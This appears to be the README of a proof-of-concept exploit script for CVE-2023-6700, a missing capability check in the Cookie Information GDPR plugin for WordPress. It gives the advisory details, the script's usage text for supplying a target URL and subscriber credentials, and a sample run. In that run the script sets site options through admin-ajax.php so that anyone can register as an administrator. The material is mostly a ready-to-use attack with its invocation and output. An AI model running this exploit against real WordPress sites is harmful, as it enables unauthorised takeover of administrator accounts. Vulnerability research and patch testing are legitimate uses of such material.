# CVE-2023-6700
Cookie Information | Free GDPR Consent Solution &lt;= 2.0.22 - Authenticated (Subscriber+) Arbitrary Options Update


### Description:
CVE-2023-6700 The Cookie Information | Free GDPR Consent Solution plugin for WordPress is vulnerable to arbitrary option updates due to a missing capability check on its AJAX request handler in versions up to, and including, 2.0.22. This makes it possible for authenticated attackers, with subscriber-level access or higher, to edit arbitrary site options which can be used to create administrator accounts.

```
Severity: high
CVE ID: CVE-2023-6700
CVSS Score: 8.8
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Plugin Slug: wp-gdpr-compliance
WPScan URL: https://www.wpscan.com/plugin/wp-gdpr-compliance
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/42a4ef37-c842-4925-b06a-3e6423337567?source=api-prod
Diff URL: https://plugins.trac.wordpress.org/changeset/3028096/wp-gdpr-compliance/trunk?contextall=1&old=2865555&old_path=%2Fwp-gdpr-compliance%2Ftrunk
```

How to use
---
```
usage: CVE-2023-6700.py [-h] -u URL [-un USERNAME] [-p PASSWORD] [-f FIX]

Cookie Information | Free GDPR Consent Solution <= 2.0.22 - Authenticated (Subscriber+) Arbitrary Options Update
Description: CVE-2023-6700 The Cookie Information | Free GDPR Consent Solution plugin for WordPress is vulnerable to
arbitrary option updates due to a missing capability check on its AJAX request handler in versions up to, and including,
2.0.22. This makes it possible for authenticated attackers, with subscriber-level access or higher, to edit arbitrary site
options which can be used to create administrator accounts.

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Website URL
  -un USERNAME, --username USERNAME
                        WordPress username
  -p PASSWORD, --password PASSWORD
                        WordPress password
  -f FIX, --fix FIX     Reset after Exploit
```

POC
---
```
python3 CVE-2023-6700.py -u http://wordpress.lan -un user -p useruser1
The plugin version is below 2.0.23.
The plugin version is 2.0.21
Vulnerability check: http://wordpress.lan
Logged in successfully.
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
You can now register a user as an admin user. Remember to run --fix yes after you have registered to prevent others exploiting the site.
```
